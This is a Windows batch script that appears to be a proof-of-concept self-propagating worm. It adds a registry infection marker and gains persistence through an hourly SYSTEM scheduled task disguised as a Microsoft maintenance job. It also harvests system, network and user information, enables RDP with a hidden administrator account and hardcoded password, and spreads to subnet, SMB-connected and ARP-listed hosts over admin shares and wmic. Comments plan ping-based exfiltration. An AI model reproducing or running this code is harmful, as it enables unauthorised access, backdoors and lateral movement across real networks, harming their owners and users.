@echo on
:global_var
	set ldir=%HOMEPATH%
	set ldir=pwnd_dir

	:: corncob possibly set as Dommain Controller or DNS?
	:: Can you ping domain controller or DNS
	:: Use for exfil 
	:: Ideally box has tcpdump so you can dump ping Base64 pattern;)
	:: Add a list of IPs to whitelist inbound_list.txt

	set corncob= 1.1.1.1

	:: get IP config
	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"Gateway""') do (
		set gw=%%d.%%e.%%f.%%g
	)
	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"IPv4""') do (
		set octet1=%%d
		set octet2=%%e
		set octet3=%%f
		set octet4=%%g
		set currentip=%octet1%.%octet2%.%octet3%.%octet4%
		findstr /IC:"%currentip%" inbound_list.txt
		if %errorlevel% equ 0 (
			::call deleteme 
			exit /b 0
	)
	call :init
	goto :EOF
	
:init
	:: Checks for infection marker if host is already infected.
	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v KillSwitch_oOoOo
	::builtin Kill switch WIP 14Jan
	if %errorlevel% equ 0 (
		::call deleteme 
		exit /b 0

	) ELSE (
		reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isPresented
		if %errorlevel% equ 1 (  
			call :initial_beacon_install

		)
		if %errorlevel% equ 0 (
			call :beacon_present_already	
		)
	)
	exit /b 0

:initial_beacon_install
	::initial target attack sequence
	call :add_marker
	call :add_persistence
	call :execute_action
	call :prop_seq
	call :execute_RDPuseradd 
	exit /b 0

:beacon_present_already
	::subsequent host sequence
	call :add_marker
	call :prop_seq
	exit /b 0

:add_marker
	:: Infection marker
	reg add HKLM\SOFTWARE\Microsoft /f /v isPresented /t REG_SZ /d 1
	exit /b 0

:add_persistence
	:: Add task schedule persistence
	copy /y %~dp0oO°º¤øø¤º°ºøo.bat %ldir%\oO°º¤øø¤º°ºøo.bat
	schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\oO°º¤øø¤º°ºøo.bat" /F
	exit /b 0

:execute_action
	:: Malicious actions go here. This POC leaves a text file with system information.
	set pwnfile="%pwnd_dir%\1338¤øø¤_%COMPUTERNAME%.txt
	echo %COMPUTERNAME% SystemInfoStart> %pwnfile%
	echo.
	systeminfo | findstr /i "Host"" >> %pwnfile%
	wmic bios get manufacturer && wmic bios get version && wmic bios get name >> %pwnfile%
	echo "Below Starts Hosts" >> %pwnfile%
	type C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#" | findstr /v "^$" | findstr /v Copyright >> %pwnfile%
	echo "Below Starts Programs Installed" >> %pwnfile%
	reg query HKEY_LOCAL_MACHINE\SOFTWARE >> %pwnfile%
	ipconfig  >> %pwnfile%
	netstat -pantofb tcp >> %pwnfile%
	net users >> %pwnfile%
	net share >> %pwnfile%
	net start >> %pwnfile%
	echo "=============================================================	" >> %pwnfile%
	exit /b 0

:execute_RDPuseradd 
	:: User:Pass
	:: oOoOo:1qaz!QAZ@WSX!QAZ
	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	net user oOoOo 1qaz!QAZ@WSX /add /Y
	net localgroup administrators oOoOo /ADD /Y
	net LOCALGROUP "Remote Desktop Users" oOoOo /ADD /Y

:prop_seq
	call :prop_subnet
	call :prop_netstat
	call :prop_arp
	exit /b 0

:prop_subnet
	:: Method 1 - Find and propagate to targets on the same subnet. Does a ping sweep to achieve this.
	setlocal enabledelayedexpansion
	for /l %%q in (0,1,255) do (
		set blackip=%octet1%.%octet2%.%octet3%.%%q
		findstr /IC:"%blackip%" inbound_list.txt
		if !errorlevel! equ 0 (
			ping %octet1%.%octet2%.%octet3%.%%q /n 2 /w 500  | findstr Reply | findstr -v unreachable
				if !errorlevel! equ 0 (
					for /f "tokens=1-2 delims= " %%x in (%ldir%\1ioOoi1) do (
						net use \\%octet1%.%octet2%.%octet3%.%%q\c$ /user:%%x %%y
						copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
						copy /y "%ldir%\1ioOoi1" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\1ioOoi1"
						net use /del \\%octet1%.%octet2%.%octet3%.%%q\c$
						wmic /node:%octet1%.%octet2%.%octet3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
					)
				)
		)
	)
	endlocal
	exit /b 0

:prop_netstat
	:: Method 2 - Find and connect to targets via netstat
	setlocal enabledelayedexpansion
	for /f "delims=" %a in ('"netstat -anp tcp | findstr ":445" | findstr -v 127.0.0.1 | findstr -v 0.0.0.0 | findstr -v Address"') do (
		for /f "tokens=4 delims=: " %b in ("%a") do (
			set %netIp%=%%b
			findstr /IC:"%netIp%" inbound_list.txt
				if !errorlevel! equ 0 (
					ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
					if !errorlevel! equ 0 (
						for /f "tokens=1-2 delims= " %%x in (%ldir%\1ioOoi1) do (
							net use \\%netIp%\c$ /user:%%x %%y
							copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%netIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
							copy /y "%ldir%\1ioOoi1" "\\%netIp%\c$\Windows\Temp\1ioOoi1"
							net use /del \\%netIp%\c$
							wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
						)
					)
				)
		)
	)
	endlocal
	exit /b 0

:prop_arp
	:: Method 3 - Find and propagate to targets on ARP tables.
	setlocal enabledelayedexpansion
	for /f "delims=" %%a in ('"arp -a | findstr "dynamic" | findstr -v "Address""') do (
		for /f "tokens=1-4 delims= " %%b in ("%%a") do (
			set %arpIp%=%%b
			findstr /IC:"%arpIp%" inbound_list.txt
			if !errorlevel! equ 0 (
				ping %arpIp% /n /w 500 | findstr Reply | findstr -v unreachable
				if !errorlevel! equ 0 (
					net use \\%arpIp%\c$ /user:%%x %%y
					copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%arpIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
					copy /y "%ldir%\1ioOoi1" "\\%arpIp%\c$\Windows\Temp\1ioOoi1"
					net use /del \\%arpIp%\c$
					wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
				)
			)
		)
	)
	endlocal
	exit /b 0
